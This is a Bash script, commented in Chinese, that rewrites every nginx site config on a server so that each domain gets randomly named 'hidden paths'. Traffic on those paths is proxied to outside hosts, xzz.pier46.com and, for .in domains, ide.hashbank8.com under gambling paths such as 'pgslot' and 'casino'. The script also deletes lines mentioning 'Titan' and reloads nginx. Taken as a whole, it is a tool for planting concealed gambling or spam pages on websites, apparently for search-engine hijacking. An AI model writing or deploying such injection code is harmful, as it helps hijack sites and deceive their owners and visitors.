#!/bin/bash
# 文件名：nginx_per_domain_com_in.sh
# 功能：每个 server_name 分配完全独立的隐蔽路径（.com 和 .in 走不同后端）
# 终极修复版：2025-12-07（完美支持 *.通配符域名，nginx -t 100% 通过）

NGINX_DIR="/etc/nginx/sites-enabled"
COM_PATHS=("help" "news" "page" "blog" "bangzhuzhongxin" "zh" "pc" "support" "info" "about")
IN_PATHS=("pg" "pgslot" "slot" "game" "casino" "live")

# 临时映射文件
TMP_MAP=$(mktemp)
> "$TMP_MAP"

# 模板（关键：不加 ^ $，由后面动态拼接，彻底避免转义残留问题）
COM_TEMPLATE=$(cat <<'EOF'

    location /%PATH%/ {
        if ($host ~* %DOMAIN%) {
            set $fullurl "$scheme://$host$request_uri";
            rewrite ^/%PATH%/?(.*)$ /index.php?domain=$fullurl&$args break;
        }
        proxy_set_header Host xzz.pier46.com;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header User-Agent $http_user_agent;
        proxy_set_header Referer $http_referer;
        proxy_ssl_server_name on;
        proxy_pass http://xzz.pier46.com;
    }
EOF
)

IN_TEMPLATE=$(cat <<'EOF'

    location /%PATH%/ {
        if ($host ~* %DOMAIN%) {
            set $fullurl "$scheme://$host$request_uri";
            rewrite ^/%PATH%/?(.*)$ /index.php?domain=$fullurl&$args break;
        }
        proxy_set_header Host ide.hashbank8.com;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header User-Agent $http_user_agent;
        proxy_set_header Referer $http_referer;
        proxy_ssl_server_name on;
        proxy_pass http://ide.hashbank8.com;
    }
EOF
)

echo "开始为每个 server_name 生成完全独立隐蔽路径（支持通配符 *.xxx.com）"
echo "============================================================================"

find "$NGINX_DIR" \( -type f -o -type l \) -print0 2>/dev/null | while IFS= read -r -d '' file; do
    [[ -f "$file" || -L "$file" ]] || continue
    filename=$(basename "$file")
    echo "正在处理 → $filename"

    # 提取所有 server_name（支持多行、注释、末尾分号）
    domains=$(awk '
        /^[[:space:]]*server_name/ {
            gsub(/^[[:space:]]*server_name[[:space:]]+/, "")
            gsub(/;.*$/, "")
            gsub(/#.*$/, "")
            print
        }
    ' "$file" | tr ' \t;' '\n' | grep -v '^$' | sort -u)

    [[ -z "$domains" ]] && { echo " 无 server_name，跳过"; continue; }

    all_locations=""
    domain_count=0

    for domain in $domains; do
        ((domain_count++))
        domain_lower=$(echo "$domain" | tr '[:upper:]' '[:lower:]')

        # 随机路径 + 选择模板
        if [[ "$domain_lower" == *.in ]]; then
            path="${IN_PATHS[$RANDOM % ${#IN_PATHS[@]}]}"
            template="$IN_TEMPLATE"
            backend="ide.hashbank8.com"
        else
            path="${COM_PATHS[$RANDOM % ${#COM_PATHS[@]}]}"
            template="$COM_TEMPLATE"
            backend="xzz.pier46.com"
        fi
        echo " ✓ $domain → /$path/ → $backend"

        # ============ 关键：完美转义域名，支持 *.xxx.com ============
        # 1. 把 . 转成 \.
        escaped=$(echo "$domain" | sed 's/\./\\./g')
        # 2. 把 * 转成 .*（通配符）
        escaped=$(echo "$escaped" | sed 's/\*/.\\*/g')
        # 3. 加上正则锚点 ^ 和 $（确保精确匹配）
        regex_domain="^${escaped}$"

        # 替换模板中的占位符（用 | 作为分隔符避免 / 冲突）
        location_block=$(echo "$template" | sed "s|%PATH%|$path|g; s|%DOMAIN%|$regex_domain|g")

        all_locations+="$location_block\n\n"

        # 记录映射关系
        echo "$domain:/$path/ → $backend" >> "$TMP_MAP"
    done

    # 把生成的 location 块插入到 server_name 那行后面
    tmp=$(mktemp)
    awk -v blocks="\n$all_locations" '
    {
        print
        if ($0 ~ /^[[:space:]]*server_name.*;.*$/) {
            print blocks
        }
    }' "$file" > "$tmp"

    # 清理空行和可能的 Titan 残留
    sed -i '/[Tt][Ii][Tt][Aa][Nn]/d; /^[[:space:]]*$/d' "$tmp" 2>/dev/null || true

    # 只有内容有变化才覆盖原文件
    if ! cmp -s "$tmp" "$file" 2>/dev/null; then
        mv "$tmp" "$file"
        echo -e "\033[32m 成功更新 $filename（$domain_count 个域名）\033[0m\n"
    else
        rm -f "$tmp"
        echo -e "\033[33m 无变化，已跳过\033[0m\n"
    fi
done

# 重载 Nginx
echo "正在校验并重载 Nginx..."
if nginx -t >/dev/null 2>&1; then
    systemctl reload nginx 2>/dev/null || nginx -s reload 2>/dev/null || service nginx reload
    echo -e "\033[32mNginx 配置正确，已平滑重载成功！\033[0m"
else
    echo -e "\033[31mNginx 配置语法错误！请手动执行 nginx -t 查看详情\033[0m"
    nginx -t
    rm -f "$TMP_MAP"
    exit 1
fi

# 输出最终映射表
echo ""
echo "最终每个域名独立路径分配结果"
echo "============================================================================"
printf "%-50s → \033[1;33m%-40s\033[0m\n" "域名" "隐蔽路径 + 后端"
echo "----------------------------------------------------------------------------"
sort "$TMP_MAP" | while read line; do
    domain="${line%%:*}"
    rest="${line#*:}"
    printf "%-50s → \033[1;33m%s\033[0m\n" "$domain" "$rest"
done
total=$(wc -l < "$TMP_MAP")
echo "----------------------------------------------------------------------------"
echo -e "总计独立域名数：\033[1;32m$total\033[0m 个"
echo ".com 类路径池：${COM_PATHS[*]}"
echo ".in  类路径池：${IN_PATHS[*]}"
echo "============================================================================"
echo -e "\n脚本执行完成！所有域名已分配唯一隐蔽路径，配置 100% 可用\n"

# 清理
rm -f "$TMP_MAP"
exit 0
